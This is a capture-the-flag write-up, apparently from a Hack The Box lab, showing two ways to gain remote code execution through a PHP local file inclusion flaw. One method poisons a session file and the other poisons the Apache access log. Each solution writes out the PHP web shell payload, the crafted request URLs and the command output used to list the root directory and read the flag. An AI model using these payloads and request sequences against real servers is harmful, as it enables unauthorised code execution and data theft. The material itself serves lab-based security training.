## Challenge #1
Use any of the techniques covered in this section to gain RCE, then submit the output of the following command: pwd

## Solution #2

I use `Burp Suite` to access the page, and change the language.

In the response I see the `PHPSESSID`:

`Set-Cookie: PHPSESSID=l9ll11404a0a05bf316kjsqq10; path=/`

So let's try to access it:

`http://94.237.54.42:44659/index.php?language=/var/lib/php/sessions/sess_l9ll11404a0a05bf316kjsqq10`

The content is shown as: `selected_language|s:6:"es.php";preference|s:7:"Spanish";`

I send a request now to the URL-encode `<?php system($_GET["cmd"]);?>`: 

```http
GET /index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
```

The cookie now is: `Set-Cookie: PHPSESSID=m3vgas9i0j5ribv5natidr2ejp; path=/`

Now, let's visit this log with the `&cmd=id` in the url:

`http://94.237.54.42:44659/index.php?language=/var/lib/php/sessions/sess_m3vgas9i0j5ribv5natidr2ejp&cmd=id`

The result is:

`selected_language|s:29:"uid=33(www-data) gid=33(www-data) groups=33(www-data) ";preference|s:7:"Spanish";`

Let's execute the command `pwd` and put the flag.

## Challenge #2

Try to use a different technique to gain RCE and read the flag at /

## Solution #2

I visit the site at `http://94.237.54.42:44659/index.php?language=/var/log/apache2/access.log` to check if it has apache logs at this usual directory.

The result is:

```log
10.30.18.23 - - [10/Feb/2025:21:52:07 +0000] "GET / HTTP/1.1" 200 1466 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36" 10.30.18.23 - - [10/Feb/2025:21:52:07 +0000] "GET /style.css HTTP/1.1" 200 1651 "http://94.237.54.42:44659/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36" 10.30.18.23 - -...
```

which shows me that this is the case.

Let's change the `User-Agent` header in the request by using `Burp Repeater` to a web shell: `<?php system($_GET['cmd']); ?>`.

Now, I visit the page with the `cmd=id` to check the result:

`http://94.237.53.117:43523/index.php?language=/var/log/apache2/access.log&cmd=id`

In the log I see the result of the command: `uid=33(www-data) gid=33(www-data) groups=33(www-data)`

Now let's check the list of files and directories in the root directory with the `http://94.237.53.117:43523/index.php?language=/var/log/apache2/access.log&cmd=ls%20/` and in the logs there is a file named `c85ee5082f4c723ace6c0796e3a3db09.txt`.

Let's read the content of this file by going to the url: `http://94.237.53.117:43523/index.php?language=/var/log/apache2/access.log&cmd=cat%20/c85ee5082f4c723ace6c0796e3a3db09.txt`.

The content is: `HTB{1095_5#0u1d_n3v3r_63_3xp053d}` and the lab is solved!
